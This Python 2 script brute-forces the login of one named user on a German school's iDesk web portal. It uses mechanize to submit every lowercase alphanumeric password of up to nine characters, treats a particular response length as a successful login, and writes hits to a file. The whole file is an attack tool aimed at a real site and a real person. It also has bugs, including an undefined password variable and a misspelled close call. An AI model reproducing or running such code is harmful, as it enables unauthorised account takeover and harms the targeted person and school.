import mechanize
import cookielib

my_file = open("out-r.txt", "r+")
my_file1 = my_file.readlines()
passwords = open("passwords.txt", "a")
lst = "abcdefghijklmnopqrstuvwxyz1234567890"

user = 'patrick.zierahn'


def check(user, passwd):

	# Browser
	br = mechanize.Browser()

	# Cookie Jar
	cj = cookielib.LWPCookieJar()
	br.set_cookiejar(cj)

	# Browser options
	br.set_handle_equiv(True)
	br.set_handle_gzip(True)
	br.set_handle_redirect(True)
	br.set_handle_referer(True)
	br.set_handle_robots(False)

	# Follows refresh 0 but not hangs on refresh > 0
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

	#Opens the site to be navigated
	br.open('https://goethe-schule-harburg.de/idesk/')

	# Select the second (index one) form
	br.select_form(nr=0)
	
	# User credentials
	br.form['login_act'] = user
	br.form['login_pwd'] = passwd

	# Login
	a = br.submit()
	b = a.readlines()
	
	return len(b)
	br.cloes

for a in lst:
	if check(user, a) == len(my_file1) - 1:
		print "Juhuu"
		passwords.write(str(user) + "\n")
		passwords.write(str(passwd) + "\n")
	else:
		print "Oh"
	for b in lst:
		if check(user, a + b) == len(my_file1) - 1:
			print "Juhuu"
			passwords.write(str(user) + "\n")
			passwords.write(str(passwd) + "\n")
		else:
			print "Oh"
		for c in lst:
			if check(user, a + b + c) == len(my_file1) - 1:
				print "Juhuu"
				passwords.write(str(user) + "\n")
				passwords.write(str(passwd) + "\n")
			
			for d in lst:
				if check(user, a + b + c + d) == len(my_file1) - 1:
					print "Juhuu"
					passwords.write(str(user) + "\n")
					passwords.write(str(passwd) + "\n")
			
				for e in lst:
					if check(user, a + b + c + d + e) == len(my_file1) - 1:
						print "Juhuu"
						passwords.write(str(user) + "\n")
						passwords.write(str(passwd) + "\n")
			
					for f in lst:
						if check(user, a + b + c + d + e + f) == len(my_file1) - 1:
							print "Juhuu"
							passwords.write(str(user) + "\n")
							passwords.write(str(passwd) + "\n")
			
						for g in lst:
							if check(user, a + b + c + d + e + f + g) == len(my_file1) - 1:
								print "Juhuu"
								passwords.write(str(user) + "\n")
								passwords.write(str(passwd) + "\n")
			
							for h in lst:
								if check(user, a + b + c + d + e + f + g + h) == len(my_file1) - 1:
									print "Juhuu"
									passwords.write(str(user) + "\n")
									passwords.write(str(passwd) + "\n")
			
								for i in lst:
									if check(user, a + b + c + d + e + f + g + h + i) == len(my_file1) - 1:
										print "Juhuu"
										passwords.write(str(user) + "\n")
										passwords.write(str(passwd) + "\n")
			
"""*
print check(user, passwd)
print len(my_file1) - 1

if check(user, passwd) == len(my_file1) - 1:
	print "Juhuu"
	passwords.write(str(user) + "\n")
	passwords.write(str(passwd) + "\n")
else:
	print "Oh"
"""
my_file.close()
passwords.close()
